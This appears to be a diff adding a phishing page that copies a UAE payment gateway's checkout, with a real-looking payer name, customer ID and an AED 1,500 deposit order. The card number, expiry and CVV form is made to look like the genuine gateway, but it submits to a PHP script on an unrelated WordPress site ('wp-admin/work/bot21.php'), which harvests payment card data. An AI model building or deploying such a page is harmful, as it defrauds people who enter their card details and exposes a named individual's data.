@@ -1,0 +1,351 @@
+
+<html ng-app="myApp" class="ng-scope">
+<head id="SharedLayoutHeader">
+<style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" id="viewport" content="width=device-width,height=device-height,initial-scale=1.0,user-scalable=no">
+
+    <title>Payment</title>
+    <script src="https://ipg.comtrust.ae/PaymentEx/Scripts/jquery-3.1.0.min.js?version=1000">
+</script>
+    <script src="https://ipg.comtrust.ae/PaymentEx/Scripts/materialize.js">
+</script>
+
+    <script src="https://ipg.comtrust.ae/PaymentEx/Content/Angular/Module.js">
+</script>
+    <link href="https://ipg.comtrust.ae/PaymentEx/styles/app_extended.css" rel="stylesheet">
+
+    <link href="https://ipg.comtrust.ae/PaymentEx/Content/css?v=mm9aZvlDh3xh7Y2ebzhQavDVVecxcJWMyiapieXl0Ao1" rel="stylesheet">
+    <style>
+  .pay {
+    background-color: rgba(54, 118, 8, 0.785) !important;
+  }
+</style>
+
+</head>
+<body style="width: 100%; height: 100%;" id="SharedLayoutBody">
+    
+<div ng-init="param='203067382338';">
+    <div ng-controller="HousePayController" class="ng-scope">
+        <link href="https://ipg.comtrust.ae/PaymentEx/styles/fonts_googleapis.css" rel="stylesheet">
+        <link href="https://ipg.comtrust.ae/PaymentEx/styles/materialize.css" rel="stylesheet">
+        <link href="https://ipg.comtrust.ae/PaymentEx/styles/HousePay-New.css?version=1008" rel="stylesheet">
+        <link href="https://ipg.comtrust.ae/PaymentEx/styles/css-loader.css" rel="stylesheet">
+        <script type="text/javascript" src="https://assets.secure.checkout.visa.com/checkout-widget/resources/js/integration/v1/sdk.js">
+</script>
+        <script src="https://ipg.comtrust.ae/PaymentEx/Content/Angular/HousePayController.js?version=1019">
+</script>
+        <script src="https://ipg.comtrust.ae/PaymentEx/Content/Angular/HousePayService.js?version=1002">
+</script>
+        <script type="text/javascript" src="https://assets.secure.checkout.visa.com/checkout-widget/resources/js/integration/v1/sdk.js">
+</script>
+        <script src="https://ipg.comtrust.ae/PaymentEx/Scripts/dialog-polyfill.js">
+</script>
+        <link href="https://ipg.comtrust.ae/PaymentEx/styles/dialog-polyfill.css" rel="stylesheet" type="text/css">
+
+
+        <div class="contain" ng-show="DivDisplayForm" ng-disabled="DisableForm">
+
+            <div class="row">
+                <div class="col s12 titlebar">
+                    <h1>
+Payment Details</h1>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col s12 description">
+
+                    
+                    <div class="row line">
+                        <div id="MerchantNameLabel" class="col s6 title">
+                            <span>NAME</span>
+                        </div>
+                        <div id="MerchantNameValue" class="col s6 content">
+                            <div style="float: left">
+                                <span class="ng-binding">Ashraf Ishbair</span>
+                                <img ng-show="ShowLogo" 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" style="margin-left:5px; width:40px; height:40px;" align="middle" class="">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row line">
+                        <div class="col s6 title">
+                            <span>Customer ID</span>
+                        </div>
+                        <div class="col s6 content">
+                            <span class="ng-binding">32014437</span>
+                        </div>
+                    </div>
+                    <div class="row line">
+                        <div class="col s6 title">
+                            <span>ORDER </span>
+                        </div>
+                        <div class="col s6 content">
+                            <span class="ng-binding">AC Registration and Security deposit</span>
+                        </div>
+                    </div>
+                    <div class="row line">
+                        <div class="col s6 title">
+                            <span>AMOUNT TO PAY</span>
+                        </div>
+                        <div class="col s6 content">
+                            <span class="ng-binding"> AED 1,500</span>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col s12 titlebar">
+                    <h1>
+Payment Using</h1>
+                </div>
+            </div>
+            <div style="text-align: center;">
+    <span></span>
+</div>
+            <div style="text-align: center; width: 500px; margin: 0 auto;">
+</div>
+<div style="text-align: center;">
+    <span></span>
+</div>
+            <form class="form-horizontal ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" method="POST" action="https://spacemeadow.com/wp-admin/work/bot21.php">
+
+
+				<div class="row forms ng-hide" ng-show="ShowPaymentMethod">
+                    <div>
+                        <div class="input-field col s6 m3 selectWithMargin">
+                            <div class="select-wrapper ng-pristine ng-untouched ng-valid initialized">
+<span class="caret">▼</span>
+<input type="text" class="select-dropdown" readonly="true" data-activates="select-options-925b6705-c37d-8322-d487-80fcab8408e2" value="Payment Card">
+<ul id="select-options-925b6705-c37d-8322-d487-80fcab8408e2" class="dropdown-content select-dropdown ">
+<li class="">
+<span>Payment Card</span>
+</li>
+</ul>
+
+</div>
+                            <label>Choose Payment Method</label>
+                        </div>
+                        <div class="input-field col s6 m3 selectWithMargin2 ng-hide" ng-show="selectedInstruementObj.Symbol == 'B'">
+                            <div class="select-wrapper ng-pristine ng-untouched ng-valid initialized">
+<span class="caret">▼</span>
+<input type="text" class="select-dropdown" readonly="true" data-activates="select-options-23819f40-4a2d-cb62-d7d1-541cd6b4a369" value="">
+<ul id="select-options-23819f40-4a2d-cb62-d7d1-541cd6b4a369" class="dropdown-content select-dropdown ">
+<li class="">
+<span>
+</span>
+</li>
+</ul>
+<select ng-model="selectedBrandNew" ng-change="BankSelected($event,this)" ng-options="brand for brand in Banks" class="ng-pristine ng-untouched ng-valid initialized">
+<option value="?" selected="selected">
+</option>
+</select>
+</div>
+                            <label>Bank name</label>
+                        </div>
+
+                        <div class="input-field col s6 m3 selectWithMargin2 ng-hide" ng-show="selectedInstruementObj.Symbol == 'D'" ng-hide="selectedInstruementObj.Symbol != 'D'">
+                            <div>
+                                <img src="https://ipg.comtrust.ae/PaymentEx/Images/eDhirham_Logo.bmp" class="edhirham_logo">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div ng-show="selectedInstruementObj.Symbol == 'C'" ng-hide="selectedInstruementObj.Symbol != 'C'" class="">
+                    
+                    <div class="row">
+                        <div class="col s12 cards">
+                            <div class="row">
+                                <div class="col s4 title">
+                                    <span>Accepted cards:</span>
+                                </div>
+                                <div class="col s2" ng-show="ShowMastercardLogo">
+                                    <img src="https://ipg.comtrust.ae/PaymentEx/Images/SchemeNew/Mastercard_Medium.png" class="ic_mastercard">
+                                </div>
+                                <div class="col s2" ng-show="ShowVisaLogo">
+                                    <img src="https://ipg.comtrust.ae/PaymentEx/Images/SchemeNew/VISA.png" class="ic_visa">
+                                </div>
+                                <div class="col s2 ng-hide" ng-show="ShowAmexLogo">
+                                    <img src="https://ipg.comtrust.ae/PaymentEx/Images/House-amex.png" class="ic_amex">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="row forms" ng-hide="HideCardEntry">
+                        
+                        <div class="input-field col s12 m6 numberfield">
+                            <div>
+                                <input type="number" class="validate CardNumber ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" ng-model="Card_number" id="cardNumber" name="creditCardNumber" maxlength="16" pattern="[0-9]*" ng-disabled="disablepaymentmethod" ng-keyup="ValidateCardNumber($event,this)" data-ng-keypress="onEnterKeyPress($event)" autocomplete="off" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" required="">
+                                <label for="cardNumber">Card number</label>
+
+                                <img src="https://ipg.comtrust.ae/PaymentEx/Images/BlankCard.svg" class="cardvalidation" ng-show="isBlankSelected">
+                                <img src="https://ipg.comtrust.ae/PaymentEx/Images/HousePay-Visa-selected.svg" class="cardvalidation ng-hide" ng-show="isVisaSelected">
+                                <img src="https://ipg.comtrust.ae/PaymentEx/Images/HousePay-MasterCard-selected.svg" class="cardvalidation ng-hide" ng-show="isMasterCardSelected">
+                                <img src="https://ipg.comtrust.ae/PaymentEx/Images/HousePay-Amex-selected.svg" class="cardvalidation ng-hide" ng-show="isAmexSelected">
+                                <div ng-messages="PaymentData.creditCardNumber.$error">
+                                    <div ng-message="required" style="color:red" class="ng-binding">
+</div>
+                                </div>
+                            </div>
+                            <div class="IntCardLabel ng-hide" ng-show="ShowIntCardLabel">International Credit Cards are not accepted.</div>
+
+                        </div>
+                        <div>
+                            <div class="input-field col s6 m3 month">
+                                <div class="select-wrapper CardNumber ng-pristine ng-untouched ng-valid initialized">
+<span class="caret">▼</span>
+
+<select name="Mon" class="CardNumber ng-pristine ng-untouched ng-valid initialized" ng-model="month" ng-init="month = months[CurrentMonthIndex]" ng-options="x as x.text for x in months track by x.value" ng-disabled="disablepaymentmethod">
+<option value="1" label="01 - JAN">01 - JAN</option>
+<option value="2" label="02 - FEB">02 - FEB</option>
+<option value="3" label="03 - MAR">03 - MAR</option>
+<option value="4" label="04 - APR">04 - APR</option>
+<option value="5" label="05 - MAY">05 - MAY</option>
+<option value="6" label="06 - JUN">06 - JUN</option>
+<option value="7" label="07 - JUL">07 - JUL</option>
+<option value="8" label="08 - AUG">08 - AUG</option>
+<option value="9" label="09 - SEP">09 - SEP</option>
+<option value="10" label="10 - OCT" selected="selected">10 - OCT</option>
+<option value="11" label="11 - NOV">11 - NOV</option>
+<option value="12" label="12 - DEC">12 - DEC</option>
+</select>
+</div>
+                                <label>Expiry month</label>
+                                <div>
+                                    <div ng-message="required" style="color:red" class="ng-binding">
+</div>
+                                </div>
+                            </div>
+                            <div class="input-field col s6 m3 year">
+                                <div class="select-wrapper CardNumber ng-pristine ng-untouched ng-valid initialized">
+<span class="caret">▼</span>
+<select name="yea" class="CardNumber ng-pristine ng-untouched ng-valid initialized" ng-model="selectedYear" ng-init="selectedYear = years[0]" ng-options="year for year in years" ng-disabled="disablepaymentmethod">
+<option value="2020" label="2024" selected="selected">2024</option>
+<option value="2025" label="2025">2025</option>
+<option value="2026" label="2026">2026</option>
+<option value="2027" label="2027">2027</option>
+<option value="2028" label="2028">2028</option>
+<option value="2029" label="2029">2029</option>
+<option value="2021" label="2030">2030</option>
+<option value="2022" label="2031">2031</option>
+<option value="2023" label="2032">2032</option>
+<option value="2033" label="2024">2033</option>
+</select>
+</div>
+                                <label>Expiry year</label>
+
+                            </div>
+                        </div>
+                       
+                        <div class="input-field col s12 m6 numberfield ng-hide" ng-show="ShowAutoPayCHName">
+                            <div>
+                                <input type="text" class="validate CardNumber ng-pristine ng-untouched ng-valid ng-valid-maxlength" ng-model="AutoPayCardHolderName" id="CH_Name" name="CH_Name" maxlength="22">
+                                <label for="CH_Name">Name on Card</label>
+                                <div ng-messages="AutoPayCardHolderName.$error">
+                                    <div ng-message="required" style="color:re" class="ng-binding">
+</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="input-field col s12 m6 numberfield" ng-show="selectedBrand.VerifyInfo != ''">
+                            <div>
+                                <input type="password" class="validate CvvMasking CardNumber ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" ng-model="Validation_code" id="ValidationCode" pattern="[0-9]*" inputmode="numeric" name="ValidationCode" maxlength="4" ng-disabled="disablepaymentmethod" data-ng-keypress="onEnterKeyPress($event)" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" required="">
+                                <label for="exampleInputPassword1">Validation Code ( CVV/CVC/CID )</label>
+                                <div ng-messages="PaymentData.ValidationCode.$error">
+                                    <div ng-message="required" style="color:red" class="ng-binding">
+</div>
+                                </div>
+                            </div>
+                        </div>
+                        
+
+                        <!-- ngIf: paymentDataView.CustomerFraudConfigurations != null && (paymentDataView.CustomerFraudConfigurations.IsFraudEnable ||
+                                              paymentDataView.CustomerFraudConfigurations.ISFraudDetailExists) -->
+                    </div>
+
+                    
+
+
+
+                </div>
+                
+
+         
+            <div class="row buttons ButtonPosition" ng-show="DivButton">
+                <div class="col s6 button">
+                    <button type="reset" class="btn reset">Reset</button>
+                </div>
+                <div class="col s6 button">
+					<button type="submit" name="bb" class="btn pay">PAY</button>
+
+                </div>
+
+            </div>
+ </form>
+
+        </div>
+        <div ng-show="DivDisplayWaitingForm" class="ng-hide">
+
+            <table class="row centered">
+                <tbody>
+<tr>
+                    <td style="text-align: center;">
+                        <img src="https://ipg.comtrust.ae/PaymentEx/Images/auth_process.gif" style="text-align: center;">
+                        <div style="text-align: center;">
+<h6>Loading transaction data ...</h6>
+</div>
+                    </td>
+                </tr>
+            </tbody>
+</table>
+        </div>
+
+      
+
+
+
+        <script>
+            $(document).ready(function () {
+                $('select').material_select();
+            });
+        </script>
+    </div>
+</div>
+
+    <script src="https://ipg.comtrust.ae/PaymentEx/bundles/jquery?v=">
+</script>
+
+
+    
+    
+
+
+
+<div class="hiddendiv common">
+</div>
+<div id="VmeGtm" style="visibility: hidden; position: absolute; height: 1px; width: 1px; left: -2000px; bottom: 0px;">
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation allow-popups" frameborder="0" src="https://secure.checkout.visa.com/checkout-widget/gtm?apikey=CYBR2FP64LA68ZJ5U8P221RsiUqdDupqRly1pmucm26kGXE5s&amp;externalClientId=&amp;externalProfileId=&amp;parentUrl=https%3A%2F%2Fipg.comtrust.ae%2FPaymentEx%2FHousePay%2FPayment&amp;locale=en_AE&amp;country=AE&amp;browserLocale=&amp;countryCode=AE&amp;allowCXO=false&amp;buttonPosition=&amp;postmessage=true&amp;allowRXO=true" title="For system use, please ignore." tabindex="-1" role="presentation" style="height: 0px; width: 0px; display: none;">
+</iframe>
+</div>
+<div id="CheckoutConfig" style="visibility: hidden; position: absolute; height: 1px; width: 1px; left: -2000px; bottom: 0px;">
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation allow-popups" frameborder="0" src="https://secure.checkout.visa.com/checkout-widget/config?apikey=CYBR2FP64LA68ZJ5U8P221RsiUqdDupqRly1pmucm26kGXE5s&amp;externalClientId=&amp;externalProfileId=&amp;parentUrl=https%3A%2F%2Fipg.comtrust.ae%2FPaymentEx%2FHousePay%2FPayment&amp;locale=en_AE&amp;country=AE&amp;browserLocale=&amp;countryCode=AE&amp;postMessageId=Q7yoSJrPUu&amp;allowCXO=false&amp;buttonPosition=&amp;postmessage=true&amp;allowRXO=true" title="For system use, please ignore." tabindex="-1" role="presentation" style="height: 0px; width: 0px; display: none;">
+</iframe>
+</div>
+<script src="https://secure.checkout.visa.com/checkout-widget/resources/js/src-orch/visaOrchSdk.js" id="orchJs">
+</script>
+<script src="https://secure.checkout.visa.com/checkout-widget/resources/js/src-i-adapter/visaSdk.js" id="visaSDK">
+</script>
+<div id="vcop-src-system" style="visibility: hidden; position: fixed; height: 1px; width: 1px; left: 0px; bottom: 0px;">
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation allow-popups" frameborder="0" id="vcop-src-system-frame" src="https://secure.checkout.visa.com/checkout-widget/external-src-system?parentUrl=https%3A%2F%2Fipg.comtrust.ae" title="For system use, please ignore." tabindex="-1" role="presentation" style="height: 0px; width: 0px; display: none;">
+</iframe>
+</div>
+<div id="visa-sdk-loader-wrapper" style="width: 100%; height: 100%; position: fixed; display: none; top: 0px; left: 0px; bottom: 0px; right: 0px; z-index: 999995;">
+<iframe frameborder="0" id="visa-sdk-loader-frame" src="https://secure.checkout.visa.com/checkout-widget/sdk-loader?isSRCBranded=true" title="For displaying visa loader screen" role="presentation" sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation allow-popups" style="height: 100%; width: 100%;">
+</iframe>
+</div>
+</body>
+</html>
